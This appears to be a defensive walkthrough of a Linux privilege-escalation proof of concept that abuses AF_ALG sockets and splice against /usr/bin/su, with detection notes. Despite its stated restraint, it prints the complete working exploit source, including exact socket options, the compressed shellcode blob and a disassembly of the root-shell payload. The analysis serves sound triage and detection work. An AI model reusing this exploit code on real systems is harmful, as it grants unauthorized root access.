# Defensive Walkthrough of copyfail.py

*2026-04-30T23:43:56Z by Showboat 0.6.1*
<!-- showboat-id: 256ed22a-620f-4e4f-a214-a85b5b20dd40 -->

This document walks through `copyfail.py` from top to bottom and explains what each line is doing, what kernel or standard-library surface it touches, and how data flows through the file.

It intentionally stops short of unpacking the exploit mechanics of the `AF_ALG` + ancillary-data + `splice` sequence in a way that would turn the script into a reusable attack recipe. The focus here is defensive comprehension: what the code asks the system to do, what should stand out during review, and which clusters of behavior are the most suspicious.

## Analyst summary

`copyfail.py` is a compact Linux-specific proof-of-concept style script. It opens `/usr/bin/su`, prepares an embedded compressed byte blob, then repeatedly drives a low-level AF_ALG crypto socket operation using hand-built options, ancillary control data, pipes, and `splice`.

The important review conclusion is not that the script uses Python, zlib, or sockets in isolation. The suspicious behavior is the combination of a privileged target binary, an embedded binary payload, Linux kernel crypto sockets, crafted control messages, zero-copy file-descriptor movement, broad exception suppression, and a final `su` launch.

For triage, read the script as three phases:

1. Set up terse aliases and byte-decoding helpers.
2. Define a worker that interacts directly with Linux AF_ALG and file descriptors.
3. Feed an embedded payload through that worker in small chunks, then execute `su`.

## Local-only handling note

This walkthrough preserves raw sample material, including suspicious strings, low-level API sequences, and the embedded compressed blob from the source. That is useful for local analysis, but it can trigger AV or EDR scanners and should be treated as controlled analyst material rather than a shareable sanitized report.

If this document needs to leave the analysis workstation, make a redacted copy that replaces the compressed payload, exact ancillary-data tuple values, and full source snippets with descriptive placeholders.

## Reading plan

1. Lines 1-6 establish the interpreter, import terse aliases, and define a tiny hex-decoding helper.
2. Lines 9-35 define the only real worker function, `c(...)`, which sets up a Linux crypto socket, configures it, sends a message with ancillary control data, and moves file bytes through a pipe and `splice`.
3. Lines 38-48 open a privileged binary, decompress an embedded byte blob, iterate over it in 4-byte chunks, feed those chunks into `c(...)`, and finally invoke `su`.

Throughout the file, shortened names like `g`, `s`, `d`, `c`, `f`, `t`, and `i` make the script smaller and harder to read quickly. That is a common trait in proof-of-concept and exploit code.

```pwsh
Get-Content copyfail.py | Select-Object -First 6 | ForEach-Object -Begin { $i = 1 } -Process { "{0,3}: {1}" -f $i++, $_ }
```

```output
  1: #!/usr/bin/env python3
  2: import os as g, zlib, socket as s
  3: 
  4: 
  5: def d(x):
  6:     return bytes.fromhex(x)
```

## Lines 1-6: interpreter, imports, and the helper

- Line 1, `#!/usr/bin/env python3`, is the standard Unix shebang. It tells a POSIX shell to locate `python3` on `PATH` when the file is executed directly.
- Line 2 imports `os` as `g`, `zlib`, and `socket` as `s`. `os` provides low-level file-descriptor and process primitives like `open`, `pipe`, `splice`, and `system`; `socket` provides raw socket access; `zlib` handles the embedded compressed blob.
- The aliasing is not technically necessary. It saves characters and reduces readability, which is often deliberate in compact proof-of-concept code.
- Lines 5-6 define `d(x)`, a one-line helper that returns `bytes.fromhex(x)`. Any time the file shows a long hex string, this helper turns it into raw bytes.
- Defensively, the presence of `socket`, `os.splice`, and manual hex decoding in such a small script is already a strong signal that the code is doing something low-level and unusual rather than routine automation.

## Variable and descriptor map

The script relies on short names, so this map is useful before reading the worker function:

| Name | Meaning in context | Type or role |
| --- | --- | --- |
| `g` | Alias for the `os` module | Provides file descriptor, pipe, splice, and process helpers. |
| `s` | Alias for the `socket` module | Creates the Linux AF_ALG socket. |
| `d` | Hex-decoding helper | Converts hex strings into raw `bytes`. |
| `c` | Worker function name and also a parameter inside that function | As a function, drives one low-level operation; as a parameter, holds a small payload chunk. |
| `f` | File descriptor returned by `os.open("/usr/bin/su", 0)` | Source descriptor used by later `splice` calls. |
| `t` | Loop counter passed into `c(...)` | Used to compute byte counts and receive length. |
| `a` | Initial AF_ALG socket | Bound and configured before `accept()`. |
| `h` | Socket option/control-message level | Set to the Linux AF_ALG level. |
| `v` | Alias for `a.setsockopt` | Keeps repeated option calls compact. |
| `u` | Accepted AF_ALG operation socket | Receives messages and spliced input. |
| `o` | Computed byte count, `t + 4` | Controls how many bytes are moved through `splice`. |
| `i` | Reused short variable | Holds either a zero byte in `c(...)` or the main loop counter outside it. |
| `r` | Read end of an OS pipe | Source side for the second `splice`. |
| `w` | Write end of an OS pipe | Destination side for the first `splice`. |
| `n` | Alias for `os.splice` | Performs descriptor-to-descriptor data movement. |
| `e` | Decompressed embedded byte string | Iterated in 4-byte chunks by the main loop. |

```pwsh
Get-Content copyfail.py | Select-Object -Skip 8 -First 27 | ForEach-Object -Begin { $i = 9 } -Process { "{0,3}: {1}" -f $i++, $_ }
```

```output
  9: def c(f, t, c):
 10:     a = s.socket(38, 5, 0)
 11:     a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
 12:     h = 279
 13:     v = a.setsockopt
 14:     v(h, 1, d("0800010000000010" + "0" * 64))
 15:     v(h, 5, None, 4)
 16:     u, _ = a.accept()
 17:     o = t + 4
 18:     i = d("00")
 19:     u.sendmsg(
 20:         [b"A" * 4 + c],
 21:         [
 22:             (h, 3, i * 4),
 23:             (h, 2, b"\x10" + i * 19),
 24:             (h, 4, b"\x08" + i * 3),
 25:         ],
 26:         32768,
 27:     )
 28:     r, w = g.pipe()
 29:     n = g.splice
 30:     n(f, w, o, offset_src=0)
 31:     n(r, u.fileno(), o)
 32:     try:
 33:         u.recv(8 + t)
 34:     except:
 35:         0
```

## Lines 9-35: the worker function `c(f, t, c)`

- Line 9 introduces `c(f, t, c)`. The parameter names are intentionally terse: `f` is a file descriptor, `t` is an offset-like integer used later to size operations, and `c` is a small bytes chunk. Reusing `c` as both the function name and a parameter also hurts readability.
- Line 10 creates a socket with numeric constants `38` and `5`. On Linux these correspond to `AF_ALG` and `SOCK_SEQPACKET`, which means the socket is talking to the kernel crypto API rather than to a network peer.
- Line 11 binds that socket to the algorithm tuple `("aead", "authencesn(hmac(sha256),cbc(aes))")`. At a defensive level, this tells you the script is selecting a kernel-provided authenticated-encryption transform and not a normal filesystem or network service.
- Line 12 stores `279` in `h`. On Linux that numeric constant is the `SOL_ALG` socket-option level used by the AF_ALG interface.
- Line 13 stores the bound method `a.setsockopt` in `v` as a short alias so repeated calls are smaller.
- Line 14 calls `setsockopt` with a long hex-decoded blob. The code is preparing algorithm-specific option bytes rather than using a friendly high-level crypto library.
- Line 15 makes a second `setsockopt` call with `None` and length `4`, which is a very low-level style of API usage and another sign the script is targeting exact kernel behavior.
- Line 16 calls `accept()` on the algorithm socket. With AF_ALG, `accept()` yields an operation socket used for actual crypto requests.
- Line 17 computes `o = t + 4`. Later calls use `o` as the byte count for data movement.
- Line 18 decodes a single zero byte and stores it in `i`, then reuses it to build several fixed-width byte strings.
- Lines 19-27 call `u.sendmsg(...)`. The normal payload is `b"A" * 4 + c`, and the second argument supplies three ancillary control messages. This is the most suspicious part of the function because it combines crafted control data with a Linux-specific crypto socket.
- Line 27 also passes the flag value `32768`, another raw numeric constant rather than a named symbol.
- Line 28 creates a pipe and gets its read and write file descriptors.
- Line 29 aliases `os.splice` to `n`.
- Line 30 splices `o` bytes from file descriptor `f` into the pipe's write end, starting from source offset `0`.
- Line 31 splices `o` bytes from the pipe's read end into the accepted crypto socket.
- Lines 32-35 attempt to receive `8 + t` bytes from the operation socket and silently ignore any exception.
- The silent `except` is important behaviorally: this function is optimized for repeated best-effort attempts, not for diagnosability or safe error handling.
- Defensively, the core signature to notice is the cluster of `AF_ALG`, raw `setsockopt`, `sendmsg` ancillary data, `pipe`, and `splice` against a descriptor originating from a privileged executable. That cluster is far more important than any one line in isolation.

```pwsh
Get-Content copyfail.py | Select-Object -Skip 37 | ForEach-Object -Begin { $i = 38 } -Process { "{0,3}: {1}" -f $i++, $_ }
```

```output
 38: f = g.open("/usr/bin/su", 0)
 39: i = 0
 40: e = zlib.decompress(
 41:     d(
 42:         "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 43:     )
 44: )
 45: while i < len(e):
 46:     c(f, i, e[i : i + 4])
 47:     i += 4
 48: g.system("su")
```

## Lines 38-48: setup, embedded blob, loop, and final invocation

- Line 38 opens `/usr/bin/su` read-only and stores the resulting file descriptor in `f`. Choosing `su` is a major clue about intent: this is not a random test file but a privileged system binary.
- Line 39 initializes `i = 0` for a loop counter.
- Lines 40-44 take a hex string, convert it to bytes with `d(...)`, then decompress it with `zlib.decompress(...)`. The result is stored in `e`.
- The structure tells you the file carries an embedded binary blob in compressed form. Compressing it keeps the source shorter and obscures the payload from a quick glance.
- Line 45 starts a loop that runs until `i` reaches the length of `e`.
- Line 46 passes the open file descriptor, the current offset-like counter, and a 4-byte slice `e[i : i + 4]` into `c(...)`.
- Line 47 advances the counter in 4-byte steps, so the decompressed blob is consumed chunk by chunk.
- Line 48 invokes `su` through `os.system(...)`. Read in sequence, the script expects the earlier loop to influence what happens when `su` is launched.
- From a review perspective, this final block establishes the overall control flow: stage a target descriptor, decode a hidden payload, feed it through a Linux-specific low-level worker in tiny chunks, then launch the targeted program.

## What's in the payload?

```asm
31 c0        xor eax, eax
31 ff        xor edi, edi
b0 69        mov al, 0x69       ; syscall 105 = setuid(0)
0f 05        syscall

48 8d 3d 0f 00 00 00   lea rdi, [rip+0xf]   ; pointer to "/bin/sh"
31 f6        xor esi, esi
6a 3b        push 59
58           pop rax             ; syscall 59 = execve
99           cdq                 ; edx = 0
0f 05        syscall

31 ff        xor edi, edi
6a 3c        push 60
58           pop rax             ; syscall 60 = exit(0)
0f 05        syscall

2f 62 69 6e 2f 73 68 00   ; "/bin/sh\0"
```

**Summary**: ```setuid(0)``` → ```execve("/bin/sh", NULL, NULL)``` → ```exit(0)```. Classic root shell payload.
The exploit splices this ELF into the memory pages backing ```/usr/bin/su``` (an SUID root binary), then executes it — so when ```su``` runs, it runs this instead, giving the caller a root shell.

## Behavior timeline

1. Python starts and imports low-level modules under short aliases.
2. `d(...)` is defined so hex text can be treated as raw bytes.
3. The worker function `c(...)` is defined but not yet run.
4. `/usr/bin/su` is opened read-only and retained as a raw file descriptor.
5. A long hex string is decoded and decompressed into `e`.
6. The main loop slices `e` into 4-byte chunks.
7. Each chunk is passed into `c(f, i, e[i : i + 4])`.
8. Each worker call creates and configures an AF_ALG operation.
9. The worker sends a normal payload plus ancillary control data to the accepted operation socket.
10. The worker moves bytes from the target descriptor through a pipe and into the operation socket with `splice`.
11. The worker attempts to read a response and ignores failures.
12. After all chunks are processed, the script invokes `su`.

## Environment and failure modes

This script assumes a Linux environment with Python support for `os.splice` and kernel support for AF_ALG. It also assumes that `/usr/bin/su` exists at that path and that the process can open it.

Likely failure points during defensive reproduction or sandbox analysis:

- `socket(38, 5, 0)` fails if AF_ALG is unavailable or blocked.
- `bind(...)` fails if the named kernel crypto algorithm is unavailable.
- `setsockopt(...)` fails if the kernel rejects the supplied AF_ALG options.
- `accept()` fails if the algorithm socket was not configured into a usable operation socket.
- `os.splice` is missing on non-Linux Python builds and may fail when either descriptor type is unsupported.
- `u.recv(...)` may fail or block depending on kernel behavior and the state of the operation socket.
- `os.system("su")` depends on PATH resolution and may behave differently from directly executing `/usr/bin/su`.

The broad `except` around `u.recv(...)` hides one class of failure from the operator. The earlier calls are not wrapped, so failures before the receive step should terminate the script noisily.

## Defensive takeaways

- This script is tightly coupled to Linux. `AF_ALG`, the algorithm bind string, and `os.splice` are the giveaway primitives.
- The compact aliases and raw numeric constants make the file look shorter, but they also hide meaning that a reviewer should immediately expand.
- The two highest-signal artifacts for detection are the access to `/usr/bin/su` and the unusual combination of `sendmsg` ancillary data with `splice` into a crypto socket.
- If you are documenting or triaging similar code, focus first on: target file descriptors, embedded blobs, Linux-specific socket families, and any suppression of exceptions that hides failed attempts.

## Detection notes

Static indicators worth preserving in analyst notes:

- The literal target path `/usr/bin/su`.
- The AF_ALG algorithm tuple `("aead", "authencesn(hmac(sha256),cbc(aes))")`.
- Raw numeric socket constants such as `38`, `5`, and `279` used instead of named symbols.
- Use of `sendmsg(...)` with ancillary data tuples.
- Use of `os.splice` with pipe file descriptors.
- A long zlib-compressed hex blob passed through `bytes.fromhex(...)`.
- A final `os.system("su")` call after low-level descriptor activity.

Runtime telemetry ideas for a monitored Linux host:

- A Python process opening `/usr/bin/su`.
- A Python process creating an AF_ALG socket.
- A process binding AF_ALG to an AEAD algorithm string.
- `sendmsg` calls that include ancillary control data on an AF_ALG operation socket.
- `splice` activity moving data from a file descriptor into a socket through a pipe.
- Immediate or near-immediate execution of `su` after the low-level socket and splice activity.

These signals are strongest when correlated. Any one of them may have benign explanations in specialist tooling, but the full sequence is unusual for ordinary application code.

## Constant reference appendix

Here is a reviewer-friendly expansion of the least ambiguous raw numeric constants used in the file:

| Literal | Likely Linux symbol | Where it appears | Why it matters |
| --- | --- | --- | --- |
| `38` | `AF_ALG` | `socket(38, 5, 0)` | Identifies the Linux kernel crypto socket family. |
| `5` | `SOCK_SEQPACKET` | `socket(38, 5, 0)` | Chooses sequenced packet semantics for the crypto socket. |
| `279` | `SOL_ALG` | `setsockopt(...)` and ancillary tuples | Selects the AF_ALG socket-option/control-message level. |
| `0` | `O_RDONLY` in `open(..., 0)` and default protocol in `socket(..., ..., 0)` | `open("/usr/bin/su", 0)` and `socket(..., 0)` | Indicates read-only open mode for the file and default protocol selection for the socket. |

A few values are intentionally left unexpanded here:

- The per-message control codes inside the ancillary-data tuples.
- The raw option numbers passed to `setsockopt`.
- The send flag value `32768`.
- The crafted byte blobs built from hex strings and repeated zero bytes.

Those values can be resolved from Linux headers, but naming and unpacking all of them would make the document more operational than is appropriate for a defensive walkthrough. For triage purposes, the important conclusion is simpler: this script is not using ordinary application-level crypto or sockets. It is targeting Linux's AF_ALG interface directly with hand-built control structures.

## Appendix: how to look constants up during triage

When you need to expand raw numeric constants in suspicious Linux code, the safest workflow is to confirm the broad category first and only drill down as far as your review needs.

### 1. Start with the obvious families

For socket-related numbers, check the standard man pages first:

```bash
man 2 socket
man 7 socket
man 7 address_families
man 7 af_alg
```

These pages usually tell you whether a number belongs to an address family, socket type, option level, or protocol-specific interface.

### 2. Search the installed headers by symbol name

If you already suspect a symbol name from context, search for the named constant in headers:

```bash
grep -R "AF_ALG" /usr/include 2>/dev/null
grep -R "SOCK_SEQPACKET" /usr/include 2>/dev/null
grep -R "SOL_ALG" /usr/include 2>/dev/null
```

For the constants used in this file, the most relevant headers are commonly:

```text
/usr/include/linux/if_alg.h
/usr/include/bits/socket.h
/usr/include/asm-generic/socket.h
```

The exact paths vary a little by distribution and C library.

### 3. If you only have the number, search by nearby context

When the code uses a bare number like `38` or `279`, search the headers for likely surrounding APIs rather than the number alone. For example, if the number appears inside `socket(...)`, search address-family definitions; if it appears in `setsockopt(...)`, search socket option levels and the protocol-specific header.

Helpful starting points:

```bash
grep -R "#define AF_" /usr/include 2>/dev/null | less
grep -R "#define SOCK_" /usr/include 2>/dev/null | less
grep -R "#define SOL_" /usr/include 2>/dev/null | less
```

### 4. Keep kernel-specific constants separate from libc constants

Some values come from generic socket headers, while others are interface-specific and live in Linux-only headers. In triage notes, it helps to label them separately:

- Generic socket/API constants: address families, socket types, common socket levels.
- Linux interface constants: AF_ALG-specific options, control-message types, and structure layouts.

That separation makes it easier to explain what is ordinary Unix socket usage versus what is unusual kernel-interface behavior.

### 5. Stop once the review question is answered

For defensive work, you usually do not need to fully decode every byte blob or every protocol-specific control field. The useful threshold is often just:

- What subsystem is this touching?
- Is it common application behavior or specialized kernel behavior?
- Does it target a privileged file, process, or interface?
- Does it construct control messages or binary structures by hand?

If the answers already establish that the code is doing targeted low-level Linux manipulation, that is often enough for triage, incident writeups, and detection engineering.
